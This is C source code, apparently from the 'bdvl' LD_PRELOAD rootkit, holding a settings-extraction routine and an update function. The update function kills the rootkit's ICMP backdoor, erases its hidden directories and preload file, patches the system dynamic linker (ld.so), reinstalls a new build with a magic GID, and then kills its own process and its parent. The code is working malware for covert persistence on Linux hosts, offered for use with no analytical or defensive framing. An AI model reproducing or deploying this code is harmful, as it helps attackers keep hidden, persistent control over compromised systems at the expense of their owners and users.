char **findsettings(const char *sopath, int *cm){
    char **values = malloc(sizeof(char*)*4);
    if(!values) return NULL;

    off_t fsize, cfile;
    unsigned char *buf;
    FILE *fp;
    size_t n;
    int c=0, got, cmark, k;
    char *markname;

    hook(CFOPEN);

    fsize = getfilesize(sopath);
    if(fsize == 0) return NULL;

    buf = malloc(fsize+1);
    if(!buf) return NULL;
    memset(buf, 0, fsize+1);

    fp = call(CFOPEN, sopath, "rb");
    if(fp == NULL) return NULL;

    do{
        n = fread(buf, 1, fsize, fp);

        for(cmark=0; marknames[cmark] != NULL; cmark++){
            c=0;
            got=0;
            markname = marknames[cmark];

            for(cfile=0; cfile < fsize && got != 1; cfile++){
                if(buf[cfile] == markname[c]){ // character match
                    if(c == strlen(markname)-1){
                        values[cmark] = malloc(PATH_MAX);
                        if(!values[cmark]){
                            free(values);
                            values=NULL;
                            goto nopenope;
                        }

                        memset(values[cmark], 0, PATH_MAX);
                        got=1; // get ready to retrieve value
                    }
                    c++;
                }else c=0;

                if(got){ // read to the end of the value. copy it.
                    k=0;
                    cfile=cfile+1;
                    while(buf[cfile] != '\0')
                        memcpy(&values[cmark][k++], &buf[cfile++], 1);
                    values[cmark][k]='\0';
                }
            }
        }
    }while(n > 0);
nopenope:
    free(buf);
    fclose(fp);

    *cm = cmark;
    return values;
}


/* uninstall current installation.
 * install new installation.
 *
 * this function is similar to bdvuninstall however there are a few minor differences.
 *   1. ld.so is not reverted, it is patched again to read from the new PRELOAD_FILE.
 *   2. HOMEDIR is not removed until the end if calling process (you) are in it installing bdvl.
 *   3. and of course..we reinstall with our new version at the very end.  */
void bdvupdate(char *const argv[]){
    char *aso = NULL;
    for(int i = 2; argv[i] != NULL; i++){
        if(strstr(argv[i], ".so."))
            aso=argv[i];
        else aso=NULL;
    }
    if(aso == NULL){
        printf("No target .so(s)\n");
        return;
    }

    printf("\nAbout to begin update...\n");
    printf("  Everything from this current installation will be removed.\n");
    printf("  So make sure you've saved stuff you wanna see again.\n");
    printf("Press enter to continue, ^C to cancel.\n");
    getchar();

    int cmark;
    char **values = findsettings(aso, &cmark);
    if(!values){
        printf("Failed finding settings\n");
        return;
    }

    char *bdvlso = values[0],
         *installdir = values[1],
         *oldpreload = values[2],
         *preloadpath = values[3];

    printf("Is PATCH_DYNAMIC_LINKER defined in this new installation? (y/n): ");
    char status=getchar();
    if(status != 'y' && status != 'Y' && status != 'n' && status != 'N'){
        printf("Invalid reply...\n");
        for(int i=0; i<cmark; i++){
            free(values[i]);
            values[i] = NULL;
        }
        free(values);
        return;
    }

    char *targetpreload;
    if(status == 'y' || status == 'Y')
        targetpreload = preloadpath;
    else
        targetpreload = oldpreload;

    printf("Ready!");

    /* kill icmp backdoor & remove old INSTALL_DIR & HOMEDIR. */
    printf("\nRemoving previous installation...\n");
#ifdef USE_ICMP_BD
    if(pdoorup()){
        printf("Killing ICMP backdoor\n");
        killrkprocs(readgid()-1);
    }
#endif
    printf("Eradicating directories\n");
    eradicatedir(INSTALL_DIR);

    int inhome=0; // installing new bdvl from homedir?
    char *cwd = getcwd(NULL, 0);
    if(cwd != NULL){
        if(strncmp(HOMEDIR, cwd, strlen(HOMEDIR)))
            eradicatedir(HOMEDIR);
        else inhome=1;
        free(cwd);
    }else eradicatedir(HOMEDIR);

    char *curpreload = OLD_PRELOAD;
#ifdef PATCH_DYNAMIC_LINKER
    curpreload = PRELOAD_FILE;
#endif
    printf("Removing preload file\n");
    if(rm(curpreload) < 0)
        printf("Failed removing preload file\n");

    printf("Removing bdvl paths\n");
    rmbdvpaths();

#ifdef UNINSTALL_MY_ASS
    printf("Uninstalling your ass\n");
    uninstallass();
#endif
    if(status == 'y' || status == 'Y'){
        printf("Patching ld.so\n");
        ldpatch(curpreload, targetpreload);
    }

    bdvinstall(argv, installdir, bdvlso, targetpreload, MAGIC_GID);
    system("cat /dev/null");
    
    for(int i=0; i<cmark; i++){
        free(values[i]);
        values[i] = NULL;
    }
    free(values);

    // now we can eradicate...
    if(inhome) eradicatedir(HOMEDIR);
    printf("\nDONE! RECONNECT!!\n");
    hook(CKILL);
    call(CKILL, getppid(), SIGKILL);
    call(CKILL, getpid(), SIGKILL);
}